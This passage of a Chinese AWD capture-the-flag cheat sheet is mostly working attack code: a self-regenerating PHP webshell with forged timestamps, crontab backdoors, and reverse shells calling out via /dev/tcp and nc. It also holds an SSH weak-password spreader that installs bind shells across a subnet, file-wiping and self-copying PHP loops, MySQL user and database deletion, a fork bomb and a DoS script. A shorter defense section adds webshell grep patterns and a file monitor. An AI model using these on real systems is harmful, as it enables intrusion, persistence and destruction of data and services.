href="http://xxx/shell2.php?pass=pass&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x5BC6;&#x7801;&#x4E3A;a&#x5C31;&#x53EF;&#x4EE5;&#x94FE;&#x63A5;&#x4E00;&#x53E5;&#x8BDD;&#xFF0C;&#x7531;&#x4E8E;pass&#x662F;md5&#x52A0;&#x5BC6;&#x5F88;&#x96BE;&#x88AB;&#x7834;&#x89E3;&#x4E5F;&#x53EF;&#x4EE5;&#x505A;&#x5230;&#x9690;&#x853D;,md5&#x503C;&#x53EF;&#x4EE5;&#x968F;&#x610F;&#x5B9A;&#x4E49;&#x3002;" target="_blank">http://xxx/shell2.php?pass=pass&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x5BC6;&#x7801;&#x4E3A;a&#x5C31;&#x53EF;&#x4EE5;&#x94FE;&#x63A5;&#x4E00;&#x53E5;&#x8BDD;&#xFF0C;&#x7531;&#x4E8E;pass&#x662F;md5&#x52A0;&#x5BC6;&#x5F88;&#x96BE;&#x88AB;&#x7834;&#x89E3;&#x4E5F;&#x53EF;&#x4EE5;&#x505A;&#x5230;&#x9690;&#x853D;,md5&#x503C;&#x53EF;&#x4EE5;&#x968F;&#x610F;&#x5B9A;&#x4E49;&#x3002;</a></p>
+<p>&#x5199;&#x5165;shell&#xFF0C; at.php&#x5185;&#x5BB9;</p>
+<pre class="language-"><code><span class="token prolog">&lt;?php
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+$file = &apos;.login.php&apos;;
+$file1 = &apos;/admin/.register.php&apos;; 
+$code = &apos;&lt;?php if(md5($_GET[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;){@eval($_REQUEST[&quot;at&quot;]);} ?&gt;</span>&apos;;
+while (1){
+    file_put_contents($file,$code);
+    system(&apos;touch -m -d &quot;2018-12-01 09:10:12&quot; .login.php&apos;);
+    file_put_contents($file1,$code);
+    system(&apos;touch -m -d &quot;2018-12-01 09:10:12&quot; /admin/.register.php&apos;);
+    usleep(5000);
+}
+?&gt;
+</code></pre><p>&#x6D4F;&#x89C8;&#x5668;&#x8BBF;&#x95EE;at.php&#xFF0C;&#x4F1A;&#x751F;&#x6210;&#x4E0D;&#x6B7B;&#x9A6C;at2.php</p>
+<pre class="language-"><code>url/upload/at.php
+</code></pre><p>&#x518D;&#x4F20;&#x5165;&#xFF0C;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;getshell</p>
+<pre class="language-"><code>url/upload/at2.php?passwd=obse007&amp;at=system(&apos;ls&apos;);
+</code></pre><h2 id="&#x6743;&#x9650;&#x7EF4;&#x6301;">&#x6743;&#x9650;&#x7EF4;&#x6301;</h2>
+<p>&#x9884;&#x7559;&#x540E;&#x95E8;&#x7684;&#x6743;&#x9650;&#x7EF4;&#x6301;&#x7279;&#x522B;&#x91CD;&#x8981;&#xFF0C;&#x4E0D;&#x8981;&#x6025;&#x7740;&#x62FF;flag&#xFF0C;&#x5F80;&#x540E;&#x6BCF;&#x4E00;&#x8F6E;&#x9884;&#x7559;&#x540E;&#x95E8;&#x90FD;&#x4F1A;&#x51CF;&#x5C11;&#xFF0C;&#x672A;&#x96E8;&#x7EF8;&#x7F2A;&#x3002;
+<strong>crontab&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;</strong>
+1.&#x4F7F;&#x7528;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x5199;&#x9A6C;</p>
+<pre class="language-"><code>system(&apos;echo &quot;* * * * * echo \&quot;&lt;?php  if(md5(\\\\\\\\\$_POST[pass])==\&apos;462d4a0e7cedd6b024a4d99f10c614d1\&apos;){@eval(\\\\\\\\\$_POST[1]);}  \&quot; &gt; /var/www/html/.index.php\n* * * * * chmod 777 /var/www/html/.index.php&quot; | crontab;whoami&apos;);
+</code></pre><p>&#x5BC6;&#x7801;&#xFF1A;atkx
+&#x6765;&#x6307;&#x5B9A;&#x7528;&#x6237;&#x8FD0;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;</p>
+<p>2.&#x4F7F;&#x7528;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x53D1;&#x9001;&#x5E26;&#x6709;flag&#x7684;&#x8BF7;&#x6C42;</p>
+<pre class="language-"><code>bash# &#x7F16;&#x8F91; crontab&#xFF1A;crontab -e
+*/5 * * * * curl 10.10.10.5:8000/submit_flag/ -d &apos;flag=&apos;$(cat /home/web/flag/flag)&apos;&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&apos;
+# &#x67E5;&#x8BE2; crontab&#xFF1A;crontab -l
+</code></pre><p>3.&#x4F7F;&#x7528;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x53CD;&#x5F39;shell</p>
+<pre class="language-"><code>bash -c bash&apos;bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&apos;
+
+nc -e /bin/bash 1.3.3.7 4444 bash
+</code></pre><p><strong>&#x53CD;&#x5F39;shell</strong>
+nc&#x53CD;&#x5F39;shell</p>
+<pre class="language-"><code>bash -i &gt;&amp; /dev/tcp/192.168.182.130/6666 0&gt;&amp;1
+</code></pre><p>&#x672C;&#x5730;</p>
+<pre class="language-"><code>nc -l -p 6666
+</code></pre><h2 id="&#x8F6F;&#x94FE;&#x63A5;">&#x8F6F;&#x94FE;&#x63A5;</h2>
+<p>&#x8F6F;&#x8FDE;&#x63A5;&#x8BED;&#x6CD5;&#xFF1A;</p>
+<pre class="language-"><code>ln -s  [shell&#x8DEF;&#x5F84;]   [&#x65B0;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;]
+</code></pre><p>&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;
+&#x8BBF;&#x95EE;/upload/new.php&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x8BBF;&#x95EE;/upload/shell.php</p>
+<pre class="language-"><code>ln -s  /var/www/html/upload/shell.php     /var/www/html/upload/new.php
+</code></pre><p>&#x8F6F;&#x8FDE;&#x63A5;&#x5229;&#x7528;</p>
+<pre class="language-"><code>root@086f12c38b93:~# ln -s /flag /var/www/html/css/flag.css
+root@086f12c38b93:~# cat /var/www/html/css/flag.css
+SL{3c7c719b9fb980dca71080b9d96c9c6aa03c16c0}
+</code></pre><p>&#x7136;&#x540E;&#x8BBF;&#x95EE;url/css/flag.css&#x5373;&#x53EF;&#x5F97;&#x5230;flag</p>
+<h2 id="ssh&#x5F31;&#x5BC6;&#x7801;&#x5229;&#x7528;">SSH&#x5F31;&#x5BC6;&#x7801;&#x5229;&#x7528;</h2>
+<pre class="language-"><code>#-*- coding:utf-8 -*-
+import paramiko
+ip = &apos;192.168.1.137&apos;
+port = &apos;22&apos;
+username = &apos;root&apos;
+passwd = &apos;123456&apos;
+# ssh &#x7528;&#x6237;&#x540D; &#x5BC6;&#x7801; &#x767B;&#x9646;
+def ssh_base_pwd(ip,port,username,passwd,cmd=&apos;cat /flag&apos;):
+    port = int(port)
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect(hostname=ip, port=port, username=username, password=passwd)
+    stdin,stdout,stderr = ssh.exec_command(cmd)
+    result = stdout.read()
+    if not result :
+        print(&quot;&#x65E0;&#x7ED3;&#x679C;!&quot;)
+        result = stderr.read()
+    ssh.close()
+    return result.decode()
+a = ssh_base_pwd(ip,port,username,passwd)
+print(a)
+
+#SL{3c7c719b9fb980dca71080b9d96c9c6aa03c16c0}
+</code></pre><p>&#x6279;&#x91CF;</p>
+<pre class="language-"><code>#-*- coding:utf-8 -*-
+import paramiko
+import threading
+import queue
+import time
+#&#x53CD;&#x5F39;shell python
+q=queue.Queue()
+#lock = threading.Lock()
+
+# ssh &#x7528;&#x6237;&#x540D; &#x5BC6;&#x7801; &#x767B;&#x9646;
+def ssh_base_pwd(ip,port,username,passwd,cmd):
+    port = int(port)
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect(hostname=ip, port=port, username=username, password=passwd)
+    stdin,stdout,stderr = ssh.exec_command(cmd)
+    result = stdout.read()
+    if not result :
+        result = stderr.read()
+    ssh.close()
+    return result.decode()
+
+def main(x):
+    shell = &apos;&apos;&apos;
+    #&#x670D;&#x52A1;&#x5668;&#x7AEF;
+    import socket
+    import os
+    s=socket.socket()   #&#x521B;&#x5EFA;&#x5957;&#x63A5;&#x5B57; #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.bind((&apos;0.0.0.0&apos;,1234))    #&#x7ED1;&#x5B9A;&#x5730;&#x5740;&#x548C;&#x7AEF;&#x53E3;#0.0.0.0&#x63A5;&#x6536;&#x4EFB;&#x610F;&#x5BA2;&#x6237;&#x7AEF;ip&#x8FDE;&#x63A5;
+    s.listen(5)                 #&#x8C03;&#x7528;listen&#x65B9;&#x6CD5;&#x5F00;&#x59CB;&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#xFF0C;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x4E3A;&#x7B49;&#x5F85;&#x8FDE;&#x63A5;&#x7684;&#x6700;&#x5927;&#x6570;&#x91CF;
+    con,addr=s.accept()     #&#x63A5;&#x53D7;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8FDE;&#x63A5;
+    #print(con,addr)
+    for i in range(10):
+        cmd=con.recv(1024)
+        print(cmd)
+        command=cmd.decode()
+        if command.startswith(&apos;cd&apos;):
+            os.chdir(command[2:].strip())   #&#x5207;&#x6362;&#x8DEF;&#x5F84;
+            result=os.getcwd()      #&#x663E;&#x793A;&#x8DEF;&#x5F84;
+        else:
+            result=os.popen(command).read()
+        if result:
+            con.send(result.encode())
+        else:
+            con.send(b&apos;OK!&apos;)
+    &apos;&apos;&apos;
+    cmd = &apos;echo \&quot;%s\&quot; &gt; ./shell.py&apos; % (shell) +&apos;&amp;&amp; python3 ./shell.py&apos;
+    port = &apos;22&apos;
+    username = &apos;root&apos;
+    passwd = &apos;toor&apos;
+
+    ip = &apos;192.168.1.{}&apos;.format(x)
+    q.put(ip.strip(),block=True, timeout=None)
+    ip_demo=q.get()
+    #&#x5224;&#x65AD;&#x662F;&#x5426;&#x6210;&#x529F;
+    try:
+        #lock.acquire()
+        res = ssh_base_pwd(ip_demo,port,username,passwd,cmd=&apos;id&apos;)
+        if res:
+            print(&quot;[ + ]Ip: %s&quot; % ip_demo +&quot; is success!!! [ + ]&quot;)
+            #lock.release()
+            ssh_base_pwd(ip_demo,port,username,passwd,cmd)
+    except:
+        print(&quot;[ - ]Ip: %s&quot; % ip_demo +&quot; is Failed&quot;)
+    if x &gt; 255:
+        print(&quot;Finshed!!!!!!!!&quot;)
+    q.task_done()
+
+#&#x7EBF;&#x7A0B;&#x961F;&#x5217;&#x90E8;&#x5206;
+th=[]
+th_num=255
+for x in range(th_num):
+        t=threading.Thread(target=main,args=(x,))
+        th.append(t)
+for x in range(th_num):
+        th[x].start()
+for x in range(th_num):
+        th[x].join()
+
+#q.join()&#x6240;&#x6709;&#x4EFB;&#x52A1;&#x5B8C;&#x6210;
+</code></pre><h2 id=""> </h2>
+<h2 id="&#x653B;&#x51FB;&#x6405;&#x5C4E;">&#x653B;&#x51FB;&#x6405;&#x5C4E;</h2>
+<p>&#x65E0;&#x9650;&#x590D;&#x5236;</p>
+<pre class="language-"><code><span class="token prolog">&lt;?php
+  set_time_limit(0);
+  ignore_user_abort(true);
+  while(1){
+      file_put_contents(randstr().&apos;.php&apos;,file_get_content(__FILE__));
+      file_get_contents(&quot;http://127.0.0.1/&quot;);
+  }
+?&gt;</span>
+</code></pre><p>&#x4FEE;&#x6539;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801;</p>
+<pre class="language-"><code>update mysql.user set authentication_string=PASSWORD(&apos;p4rr0t&apos;);# &#x4FEE;&#x6539;&#x6240;&#x6709;&#x7528;&#x6237;&#x5BC6;&#x7801;
+flush privileges;
+UPDATE mysql.user SET User=&apos;aaaaaaaaaaaa&apos; WHERE user=&apos;root&apos;; 
+flush privileges;
+delete from mysql.user ;#&#x5220;&#x9664;&#x6240;&#x6709;&#x7528;&#x6237;
+flush privileges;
+</code></pre><p>&#x91CD;&#x542F; apache2 &#x548C; nigix</p>
+<pre class="language-"><code>#!/usr/bin/env sh
+while [[ 1 ]]
+do
+    service apache2 stop
+    service nginx stop
+done &amp;
+</code></pre><p>&#x5FAA;&#x73AF;&#x5220;&#x9664;</p>
+<pre class="language-"><code><span class="token prolog">&lt;?php
+    set_time_limit(0);
+    ignore_user_abort(1);
+    unlink(__FILE__);
+    function getfiles($path){
+        foreach(glob($path) as $afile){
+            if(is_dir($afile))
+                getfiles($afile.&apos;/*.php&apos;);
+            else
+                @file_put_contents($afile,&quot;#Anything#&quot;);
+                //unlink($afile);
+        }
+    }
+    while(1){
+        getfiles(__DIR__);
+        sleep(10);
+    }
+?&gt;</span>
+
+<span class="token prolog">&lt;?php
+    set_time_limit(0);
+    ignore_user_abort(1);
+    array_map(&apos;unlink&apos;, glob(&quot;some/dir/*.php&quot;));
+?&gt;</span>
+</code></pre><p>&#x5220;&#x9664;&#x6570;&#x636E;&#x5E93;</p>
+<pre class="language-"><code>#!/usr/bin/env python3
+  import base64
+  def rm_db(db_user,my_db_passwd):
+      cmd = &quot;/usr/bin/mysql -h localhost -u%s %s -e &apos;&quot;%(db_user,my_db_passwd)
+      db_name = [&apos;performance_schema&apos;,&apos;mysql&apos;,&apos;flag&apos;]
+      for db in db_name:
+          cmd += &quot;drop database %s;&quot;%db
+      cmd += &quot;&apos;&quot;
+      return cmd
+</code></pre><p>fork_bomb</p>
+<pre class="language-"><code>#!/bin/sh
+/bin/echo &apos;.() { .|.&amp; } &amp;&amp; .&apos; &gt; /tmp/aaa;/bin/bash /tmp/aaa;
+</code></pre><p>DOS&#x811A;&#x672C;&#xFF08;&#x975E;&#x5FC5;&#x8981;&#x6700;&#x597D;&#x4E0D;&#x8981;&#x7528;&#xFF09;</p>
+<pre class="language-"><code>import socket
+import time
+import threading
+
+max=90000000
+port=80                 #&#x7AEF;&#x53E3;
+host=&quot;192.168.92.154&quot;   #IP
+page=&quot;/index.php&quot;
+
+bag=(&quot;POST %s HTTP/1.1\r\n&quot;
+    &quot;host: %s\r\n&quot;
+    &quot;Content-Length: 1000000000\r\n&quot;
+    &quot;Cookie: 1998\r\n&quot;
+    &quot;\r\n&quot; % (page,host))
+
+socks = []
+
+def connect():
+    global socks
+    for i in range(0,max):
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        try:
+            s.connect((host,port))
+            s.send(bag.encode(&quot;utf-8&quot;))
+            socks.append(s)
+        except Exception as ex:
+            time.sleep(1)
+
+def send():
+    global socks
+    while True:
+        for s in socks:
+            try:
+                print(&quot;&#x653B;&#x51FB;&#x4E2D;....&quot;)
+            except Exception as ex:
+                socks.remove(s)
+                s.close()
+        time.sleep(0.1)
+
+One = threading.Thread(target=connect,args=())
+Two = threading.Thread(target=send,args=())
+One.start()
+Two.start()
+</code></pre><h1 id="&#x9632;&#x5B88;&#x601D;&#x8DEF;">&#x9632;&#x5B88;&#x601D;&#x8DEF;</h1>
+<h2 id="&#x57FA;&#x7840;&#x67E5;&#x6740;">&#x57FA;&#x7840;&#x67E5;&#x6740;</h2>
+<p>&#x5BFB;&#x627E;&#x6700;&#x8FD1;20&#x5206;&#x949F;&#x4FEE;&#x6539;&#x8FC7;&#x7684;&#x6587;&#x4EF6;</p>
+<pre class="language-"><code>find /var/www/html -name *.php -mmin -20
+</code></pre><p>&#x5BFB;&#x627E;&#x884C;&#x6570;&#x6700;&#x77ED;&#x7684;&#x6587;&#x4EF6;&#xFF1A;</p>
+<pre class="language-"><code>find ./ -name &apos;*.php&apos; | xargs wc -l | sort -u
+</code></pre><p>&#x5173;&#x952E;&#x5B57;&#x67E5;&#x6740;</p>
+<pre class="language-"><code>find . -name &apos;*.php&apos; | xargs grep -n &apos;eval(&apos;
+find . -name &apos;*.php&apos; | xargs grep -n &apos;assert&apos;
+find . -name &apos;*.php&apos; | xargs grep -n &apos;system()&apos;
+</code></pre><p>&#x67E5;&#x627E;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x51FD;&#x6570;</p>
+<pre class="language-"><code>find /var/www/html -name &quot;*.php&quot; |xargs egrep &apos;assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\(&apos;
+</code></pre><h2 id="&#x6587;&#x4EF6;&#x76D1;&#x63A7;">&#x6587;&#x4EF6;&#x76D1;&#x63A7;</h2>
+<p>&#x811A;&#x672C;</p>
+<pre class="language-"><code># -*- coding: utf-8 -*-
+#use: python file_check.py ./
+
+import os
+import hashlib
+import shutil
+import ntpath
+import time
+
+CWD = os.getcwd()
+FILE_MD5_DICT = {}      # &#x6587;&#x4EF6;MD5&#x5B57;&#x5178;
+ORIGIN_FILE_LIST = []
+
+# &#x7279;&#x6B8A;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x5B57;&#x7B26;&#x4E32;
+Special_path_str = &apos;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&apos;
+bakstring = &apos;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&apos;
+logstring = &apos;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&apos;
+webshellstring = &apos;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&apos;
+difffile = &apos;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&apos;
+
+Special_string = &apos;drops_log&apos;  # &#x514D;&#x6B7B;&#x91D1;&#x724C;
+UNICODE_ENCODING = &quot;utf-8&quot;
+INVALID_UNICODE_CHAR_FORMAT = r&quot;\?%02x&quot;
+
+# &#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x5B57;&#x5178;
+spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))
+Special_path = {
+    &apos;bak&apos; : os.path.realpath(os.path.join(spec_base_path, bakstring)),
+    &apos;log&apos; : os.path.realpath(os.path.join(spec_base_path, logstring)),
+    &apos;webshell&apos; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),
+    &apos;difffile&apos; : os.path.realpath(os.path.join(spec_base_path, difffile)),
+}
+
+def isListLike(value):
+    return isinstance(value, (list, tuple, set))
+
+# &#x83B7;&#x53D6;Unicode&#x7F16;&#x7801;
+def getUnicode(value, encoding=None, noneToNull=False):
+
+    if noneToNull and value is None:
+        return NULL
+
+    if isListLike(value):
+        value = list(getUnicode(_, encoding, noneToNull) for _ in value)
+        return value
+
+    if isinstance(value, unicode):
+        return value
+    elif isinstance(value, basestring):
+        while True:
+            try:
+                return unicode(value, encoding or UNICODE_ENCODING)
+            except UnicodeDecodeError, ex:
+                try:
+                    return unicode(value, UNICODE_ENCODING)
+                except:
+                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]
+    else:
+        try:
+            return unicode(value)
+        except UnicodeDecodeError:
+            return unicode(str(value), errors=&quot;ignore&quot;)
+
+# &#x76EE;&#x5F55;&#x521B;&#x5EFA;
+def mkdir_p(path):
+    import errno
+    try:
+        os.makedirs(path)
+    except OSError as exc:
+        if exc.errno == errno.EEXIST and os.path.isdir(path):
+            pass
+        else: raise
+
+# &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;
+def getfilelist(cwd):
+    filelist = []
+    for root,subdirs, files in os.walk(cwd):
+        for filepath in files:
+            originalfile = os.path.join(root, filepath)
+            if Special_path_str not in originalfile:
+                filelist.append(originalfile)
+    return filelist
+
+# &#x8BA1;&#x7B97;&#x673A;&#x6587;&#x4EF6;MD5&#x503C;
+def calcMD5(filepath):
+    try:
+        with open(filepath,&apos;rb&apos;) as f:
+            md5obj = hashlib.md5()
+            md5obj.update(f.read())
+            hash = md5obj.hexdigest()
+            return hash
+    except Exception, e:
+        print u&apos;[!] getmd5_error : &apos; + getUnicode(filepath)
+        print getUnicode(e)
+        try:
+            ORIGIN_FILE_LIST.remove(filepath)
+            FILE_MD5_DICT.pop(filepath, None)
+        except KeyError, e:
+            pass
+
+# &#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;MD5
+def getfilemd5dict(filelist = []):
+    filemd5dict = {}
+    for ori_file in filelist:
+        if Special_path_str not in ori_file:
+            md5 = calcMD5(os.path.realpath(ori_file))
+            if md5:
+                filemd5dict[ori_file] = md5
+    return filemd5dict
+
+# &#x5907;&#x4EFD;&#x6240;&#x6709;&#x6587;&#x4EF6;
+def backup_file(filelist=[]):
+    # if len(os.listdir(Special_path[&apos;bak&apos;])) == 0:
+    for filepath in filelist:
+        if Special_path_str not in filepath:
+            shutil.copy2(filepath, Special_path[&apos;bak&apos;])
+
+if __name__ == &apos;__main__&apos;:
+    print u&apos;---------start------------&apos;
+    for value in Special_path:
+        mkdir_p(Special_path[value])
+    # &#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x5E76;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x7684;MD5&#xFF0C;&#x540C;&#x65F6;&#x5907;&#x4EFD;&#x6240;&#x6709;&#x6587;&#x4EF6;
+    ORIGIN_FILE_LIST = getfilelist(CWD)
+    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)
+    backup_file(ORIGIN_FILE_LIST) # TODO &#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x53EF;&#x80FD;&#x4F1A;&#x4EA7;&#x751F;&#x91CD;&#x540D;BUG
+    print u&apos;[*] pre work end!&apos;
+    while True:
+        file_list = getfilelist(CWD)
+        # &#x79FB;&#x9664;&#x65B0;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;
+        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))
+        if len(diff_file_list) != 0:
+            # import pdb;pdb.set_trace()
+            for filepath in diff_file_list:
+                try:
+                    f = open(filepath, &apos;r&apos;).read()
+                except Exception, e:
+                    break
+                if Special_string not in f:
+                    try:
+                        print u&apos;[*] webshell find : &apos; + getUnicode(filepath)
+                        shutil.move(filepath, os.path.join(Special_path[&apos;webshell&apos;], ntpath.basename(filepath) + &apos;.txt&apos;))
+                    except Exception as e:
+                        print u&apos;[!] move webshell error, &quot;%s&quot; maybe is webshell.&apos;%getUnicode(filepath)
+                    try:
+                        f = open(os.path.join(Special_path[&apos;log&apos;], &apos;log.txt&apos;), &apos;a&apos;)
+                        f.write(&apos;newfile: &apos; + getUnicode(filepath) + &apos; : &apos; + str(time.ctime()) + &apos;\n&apos;)
+                        f.close()
+                    except Exception as e:
+                        print u&apos;[-] log error : file move error: &apos; + getUnicode(e)
+
+        # &#x9632;&#x6B62;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x88AB;&#x4FEE;&#x6539;,&#x8FD8;&#x539F;&#x88AB;&#x4FEE;&#x6539;&#x6587;&#x4EF6;
+        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)
+        for filekey in md5_dict:
+            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:
+                try:
+                    f = open(filekey, &apos;r&apos;).read()
+                except Exception, e:
+                    break
+                if Special_string not in f:
+                    try:
+                        print u&apos;[*] file had be change : &apos; + getUnicode(filekey)
+                        shutil.move(filekey, os.path.join(Special_path[&apos;difffile&apos;], ntpath.basename(filekey) + &apos;.txt&apos;))
+                        shutil.move(os.path.join(Special_path[&apos;bak&apos;], ntpath.basename(filekey)), filekey)
+                    except Exception as e:
+                        print u&apos;[!] move webshell error, &quot;%s&quot; maybe is webshell.&apos;%getUnicode(filekey)
+                    try:
+                        f = open(os.path.join(Special_path[&apos;log&apos;], &apos;log.txt&apos;), &apos;a&apos;)
+                        f.write(&apos;diff_file: &apos; + getUnicode(filekey) + &apos; : &apos; + getUnicode(time.ctime()) + &apos;\n&apos;)
+                        f.close()
+                    except Exception as e:
+                        print u&apos;[-] log error : done_diff: &apos; + getUnicode(filekey)
+                        pass
+        time.sleep(2)
+        # print &apos;[*] &apos; + getUnicode(time.ctime())
+</code></pre><p>&#x8FD0;&#x884C;</p>
+<pre class="language-"><code>python jiankong.py  /var/www/html
+</code></pre><h2 id="alias&#x8D77;&#x522B;&#x540D;">alias&#x8D77;&#x522B;&#x540D;</h2>
+<pre class="language-"><code>alias cat=&quot;echo nothing&quot;
+</code></pre><p>&#x5220;&#x9664;</p>
+<pre class="language-"><code>unalias -a
+</code></pre><p>&#x5BF9;&#x65B9;&#x6267;&#x884C;cat /flag&#x547D;&#x4EE4;&#x7684;&#x65F6;&#x5019;&#x56DE;&#x663E;&#x5C31;&#x662F;&#x9519;&#x8BEF;flag</p>
+<pre class="language-"><code>alias cat=&quot;echo `date`|md5sum|cut -d &apos; &apos; -f1||&quot;
+</code></pre><p>&#x83B7;&#x53D6; flag &#x4E00;&#x822C;&#x662F; curl <a href="http://xxx.com/flag.txt" target="_blank">http://xxx.com/flag.txt</a></p>
+<pre class="language-"><code>alias curl=&apos;echo fuckoff&apos; #&#x6743;&#x9650;&#x8981;&#x6C42;&#x8F83;&#x4F4E;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x6539;&#x6210;&#x865A;&#x5047;&#x7684;flag
+# &#x6216;&#x8005;
+chmod -x curl #&#x6743;&#x9650;&#x8981;&#x6C42;&#x8F83;&#x9AD8;
+/usr/bin curl&#x8DEF;&#x5F84;
+</code></pre><h2 id="&#x6740;&#x4E0D;&#x6B7B;&#x9A6C;">&#x6740;&#x4E0D;&#x6B7B;&#x9A6C;</h2>
+<p>&#x67E5;&#x770B;&#x8FDB;&#x7A0B;</p>
+<pre class="language-"><code>root@1177499f5b23:~# ps aux | grep www-data
+www-data  4819  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND
+www-data  6663  0.0  0.6 316188 13460 ?        S    Dec16   0:00 apache2 -D FOREGROUND
+www-data  6675  0.0  0.3 315620  6976 ?        S    Dec16   0:00 apache2 -D FOREGROUND
+www-data  6690  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND
+www-data  6693  0.0  0.4 315800  9056 ?        S    Dec16   0:00 apache2 -D FOREGROUND
+www-data  7170  0.0  0.6 316312 14100 ?        S    Dec16   0:00 apache2 -D FOREGROUND
+www-data  7239  0.0  0.6 316172 14020 ?        S    Dec16   0:00 apache2 -D FOREGROUND
+www-data  7526  0.0  0.4 315620  8364 ?        S    Dec16   0:00 apache2 -D FOREGROUND
+www-data  8380  0.0  0.6 316188 12612 ?        S    Dec16   0:00 apache2 -D FOREGROUND
+www-data 22554  0.0  0.3 315564  7416 ?        S    03:10   0:00 apache2 -D FOREGROUND
+root     25353  0.0  0.0   8868  1544 pts/1    S+   05:25   0:00 grep --color=auto www-data
+</code></pre><p>(1)&#x6740;&#x8FDB;&#x7A0B;</p>
+<pre class="language-"><code>kill -9 &#x5BF9;&#x5E94;&#x7684;&#x8FDB;&#x7A0B;&#x53F7;
+</code></pre><p>&#x6267;&#x884C;&#x547D;&#x4EE4;</p>
+<pre class="language-"><code>ps aux | grep www-data | awk &apos;{print $2}&apos; | xargs kill -9
+ps aux | grep www-data | grep -v grep | awk &apos;{print $2}&apos; | xargs kill -9
+</code></pre><p>&#x539F;&#x7406;</p>
+<pre class="language-"><code>ps aux
+&#x5217;&#x51FA;&#x8FDB;&#x7A0B;&#x4FE1;&#x606F;
+
+grep www-data
+&#x5728;&#x8FDB;&#x7A0B;&#x4FE1;&#x606F;&#x4E2D;&#x627E;&#x5230;&#x9700;&#x8981;&#x6740;&#x6B7B;&#x7684;&#x8FDB;&#x7A0B;
+
+grep -v grep
+&#x5728;&#x8FDB;&#x7A0B;&#x4FE1;&#x606F;&#x4E2D;&#x5254;&#x9664;&#x5E26;grep&#x7684;&#x4FE1;&#x606F;
+
+awk &#x2018;{print $2}&#x2019;
+&#x63D0;&#x53D6;&#x5B57;&#x7B26;&#x4E32;&#x884C;&#x5185;&#x5BB9;&#x7684;&#x7B2C;2&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5F53;&#x524D;&#x793A;&#x4F8B;&#x7684;&#x8FDB;&#x7A0B;&#x53F7;
+
+xargs kill -9
+&#x5C06;&#x8FDB;&#x7A0B;&#x53F7;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x4F20;&#x9012;&#x7ED9;kill -9&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;
+</code></pre><p>&#x7136;&#x540E;&#x5220;&#x9664;&#x4E0D;&#x6B7B;&#x9A6C;&#x6587;&#x4EF6;</p>
+<p>(2)&#x91CD;&#x542F;php&#x7B49;web&#x670D;&#x52A1;&#xFF0C;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;</p>
+<pre class="language-"><code>service php-fpm restart
